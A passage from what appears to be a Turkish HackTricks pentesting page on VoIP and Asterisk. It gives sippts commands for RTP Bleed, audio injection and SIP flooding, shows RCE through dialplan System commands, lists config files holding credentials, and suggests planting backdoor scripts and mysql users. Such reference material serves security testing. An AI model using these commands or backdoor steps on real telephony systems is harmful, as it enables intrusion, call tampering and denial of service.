* [**sippts**](https://github.com/Pepelux/sippts) tarafından **`SIPPTS rtpbleed`** adlı araç: SIPPTS rtpbleed, RTP Bleed zafiyetini tespit ederek RTP akışları gönderir.
```bash
sippts rtpbleed -i 10.10.0.10
```
* **`SIPPTS rtcpbleed`** [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtcpbleed, RTP Bleed zafiyetini RTCP akışları göndererek tespit eder.
```bash
sippts rtcpbleed -i 10.10.0.10
```
* **`SIPPTS rtpbleedflood`** [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedflood, RTP akışları göndererek RTP Sızıntısı zafiyetini sömürür.
```bash
sippts rtpbleedflood -i 10.10.0.10 -p 10070 -v
```
* **`SIPPTS rtpbleedinject`** [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedinject, RTP Bleed zafiyetini enjekte ederek bir ses dosyası (WAV formatında) enjekte eder.
```bash
sippts rtpbleedinject -i 10.10.0.10 -p 10070 -f audio.wav
```
### Uzaktan Kod Çalıştırma (RCE)

Asterisk'te bir şekilde **dahili numara kuralları ekleyip yeniden yükleyebilirseniz** (örneğin, zayıf bir web yönetici sunucusunu ele geçirerek), **`System`** komutunu kullanarak RCE elde etmek mümkündür.
```scss
same => n,System(echo "Called at $(date)" >> /tmp/call_log.txt)
```
**`Shell`** komutu, gerektiğinde sistem komutlarını çalıştırmak için **`System`** yerine kullanılabilecek bir komuttur.

{% hint style="warning" %}
Sunucu, **`System`** komutunda belirli karakterlerin kullanımını engelliyorsa (örneğin Elastix'te), web sunucunun sistemin içinde dosya oluşturmaya izin verip vermediğini kontrol edin (örneğin Elastix veya trixbox'ta) ve bunu kullanarak bir arka kapı betiği oluşturun ve ardından **`System`** komutunu kullanarak o **betiği çalıştırın**.
{% endhint %}

#### İlginç yerel dosyalar ve izinler

* **`sip.conf`** -> SIP kullanıcılarının şifresini içerir.
* **Asterisk sunucusu root olarak çalışıyorsa**, root hesabını tehlikeye atabilirsiniz.
* **mysql root kullanıcısının** muhtemelen **herhangi bir şifresi yoktur**.
* Bu, arka kapı olarak yeni bir mysql kullanıcısı oluşturmak için kullanılabilir.
* **`FreePBX`**
* **`amportal.conf`** -> Web panel yöneticisinin şifresini içerir (FreePBX)
* **`FreePBX.conf`** -> Veritabanına erişmek için kullanılan FreePBXuser kullanıcısının şifresini içerir
* Bu, arka kapı olarak yeni bir mysql kullanıcısı oluşturmak için kullanılabilir.
* **`Elastix`**
* **`Elastix.conf`** -> mysql root şifresi, IMAPd şifresi, web yönetici şifresi gibi birçok şifreyi düz metin olarak içerir.
* **Birkaç klasör**, tehlikeye atılan asterisk kullanıcısına ait olacaktır (eğer root olarak çalışmıyorsa). Bu kullanıcı önceki dosyaları okuyabilir ve ayrıca yapılandırmayı kontrol eder, bu nedenle Asterisk'i başka arka kapılı ikili dosyaları yüklemeye zorlayabilir.

### RTP Enjeksiyonu

**`rtpinsertsound`** (`sudo apt install rtpinsertsound`) ve **`rtpmixsound`** (`sudo apt install rtpmixsound`) gibi araçları kullanarak konuşmalara **`.wav`** dosyası eklemek mümkündür.

Ya da [http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/](http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/) adresinden **konuşmaları tarayarak** (**`rtpscan.pl`**), bir `.wav` dosyasını bir konuşmaya göndererek (**`rtpsend.pl`**) ve bir konuşmaya **gürültü ekleyerek** (**`rtpflood.pl`**) kullanabilirsiniz.

### DoS

VoIP sunucularında DoS elde etmek için birkaç yol vardır.

* [**sippts**](https://github.com/Pepelux/sippts)**'den **`SIPPTS flood`**: SIPPTS flood, hedefe sınırsız mesaj gönderir.
* `sippts flood -i 10.10.0.10 -m invite -v`
* [**sippts**](https://github.com/Pepelux/sippts)**'den **`SIPPTS ping`**: SIPPTS ping, sunucu yanıt süresini görmek için bir SIP ping yapar.
* `sippts ping -i 10.10.0.10`
* [**IAXFlooder**](https://www.kali.org/tools/iaxflood/): Asterisk tarafından kullanılan IAX protokolüne DoS yapar
* [**inviteflood**](https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt): UDP/IP üzerinden SIP/SDP INVITE mesajı sızdırmak için bir araç.
* [**rtpflood**](https://www.kali.org/tools/rtpflood/): Birkaç iyi oluşturulmuş RTP paketi gönderir. İlk önce kullanılan RTP portlarını bilmek gerekir (önce sniff yapın).
* [**SIPp**](https://github.com/SIPp/sipp): SIP trafiğini analiz etmeye ve oluşturmaya izin verir. Bu nedenle DoS için de kullanılabilir.
* [**SIPsak**](https://github.com/nils-ohlmeier/sipsak): SIP İsviçre çakısı. Ayrıca SIP saldırıları gerçekleştirmek için de kullanılabilir.
* Fuzzerlar: [**protos-sip**](https://www.kali.org/tools/protos-sip/), [**voiper**](https://github.com/gremwell/voiper).

### İşletim Sistemi Güvenlik Açıkları

Asterisk gibi bir yazılımı yüklemenin en kolay yolu, zaten yüklü olan bir **işletim sistemi dağıtımını** indirmektir, örneğin: **FreePBX, Elastix, Trixbox**... Bunlarla ilgili sorun, bir kez çalıştığında sistem yöneticilerinin muhtemelen bunları **tekrar güncellemeyeceği** ve zamanla **güvenlik açıklarının keşfedileceği**dir.

## Referanslar

* [https://github.com/Pepelux/sippts/wiki](https://github.com/Pepelux/sippts/wiki)
* [https://github.com/EnableSecurity/sipvicious](https://github.com/EnableSecurity/sipvicious)
* [http://blog.pepelux.org/](http://blog.pepelux.org/)
* [https://www.rtpbleed.com/](https://www.rtpbleed.com/)
* [https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4](https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4)
* [https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahramana kadar AWS hacklemeyi öğrenin</summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerimizden oluşan PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u takip edin.
* **Hacking püf noktalarınızı göndererek HackTricks ve HackTricks Cloud** github depolarına PR göndererek paylaşın.

</details>
